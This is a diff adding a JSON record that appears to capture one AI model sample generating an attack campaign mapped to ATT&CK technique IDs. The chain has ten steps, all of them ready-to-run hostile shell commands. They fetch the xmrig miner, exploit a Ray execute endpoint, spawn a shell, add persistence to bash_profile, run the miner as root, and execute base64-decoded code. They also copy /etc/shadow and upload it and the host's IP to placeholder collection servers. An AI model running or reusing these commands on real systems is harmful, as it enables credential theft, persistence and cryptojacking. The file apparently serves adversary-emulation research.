@@ -1,0 +1,103 @@
+{
+  "campaign_id": "C0045",
+  "model": "gpt-oss:20b",
+  "sample": 1,
+  "temperature": 0.7,
+  "realizations": [
+    {
+      "technique_id": "T1588.002",
+      "mechanism": "download-xmrig-and-interactsh",
+      "command": "wget https://example.com/xmrig.tar.gz && tar -xf xmrig.tar.gz && wget https://interact.sh/cli",
+      "target": "actor.primary",
+      "parameters": {
+        "xmrig_url": "https://example.com/xmrig.tar.gz",
+        "interactsh_cli_url": "https://interact.sh/cli"
+      }
+    },
+    {
+      "technique_id": "T1190",
+      "mechanism": "ray-exploit",
+      "command": "curl -X POST http://endpoint.public_service/ray/v1/execute -d '{\"cmd\":\"cat /etc/passwd\"}'",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "exploit_url": "http://endpoint.public_service/ray/v1/execute",
+        "payload_json": "{\"cmd\":\"cat /etc/passwd\"}"
+      }
+    },
+    {
+      "technique_id": "T1059.006",
+      "mechanism": "python-pty-shell",
+      "command": "python3 -c 'import pty,os;pty.spawn(\"/bin/sh\")'",
+      "target": "target.primary",
+      "parameters": {}
+    },
+    {
+      "technique_id": "T1546.004",
+      "mechanism": "bashrc-modify",
+      "command": "echo 'python /tmp/malicious.py' >> ~/.bash_profile",
+      "target": "target.primary",
+      "parameters": {
+        "malicious_script_path": "/tmp/malicious.py"
+      }
+    },
+    {
+      "technique_id": "T1068",
+      "mechanism": "setuid-escalate",
+      "command": "sudo -u root /tmp/xmrig --runasroot",
+      "target": "target.primary",
+      "parameters": {
+        "payload_path": "/tmp/xmrig"
+      }
+    },
+    {
+      "technique_id": "T1027.013",
+      "mechanism": "base64-exec",
+      "command": "echo 'cHJpbnQoIkhlbGxvIHRoaXMgaXMgdGVzdC4iKQ==' | base64 -d | python3",
+      "target": "target.primary",
+      "parameters": {
+        "encoded_string": "cHJpbnQoIkhlbGxvIHRoaXMgaXMgdGVzdC4iKQ=="
+      }
+    },
+    {
+      "technique_id": "T1003.008",
+      "mechanism": "shadow-cat",
+      "command": "cat /etc/shadow > /tmp/hashes.txt && curl -X POST http://channel.private_http/upload -F file=@/tmp/hashes.txt",
+      "target": "target.primary",
+      "parameters": {
+        "upload_url": "http://channel.private_http/upload"
+      }
+    },
+    {
+      "technique_id": "T1016",
+      "mechanism": "dns-query-discover",
+      "command": "dig +short myip.opendns.com @resolver1.opendns.com > /tmp/ip.txt && curl -X POST http://channel.private_http/report -d @/tmp/ip.txt",
+      "target": "target.primary",
+      "parameters": {
+        "dns_server": "resolver1.opendns.com",
+        "report_url": "http://channel.private_http/report"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "curl-download-xmrig",
+      "command": "curl -o /tmp/xmrig https://endpoint.public_service/xmrig && chmod +x /tmp/xmrig",
+      "target": "target.primary",
+      "parameters": {
+        "download_url": "https://endpoint.public_service/xmrig"
+      }
+    },
+    {
+      "technique_id": "T1496.001",
+      "mechanism": "xmrig-gpu-mining",
+      "command": "/tmp/xmrig --gpu -c config.json &",
+      "target": "target.primary",
+      "parameters": {
+        "config_path": "config.json"
+      }
+    }
+  ],
+  "raw_proposal_keys": [
+    "realizations"
+  ],
+  "response_sha256": "5446efa4c2f09901b3585bff95a950069411ed9796fef95857a4b6aea2d18a61"
+}
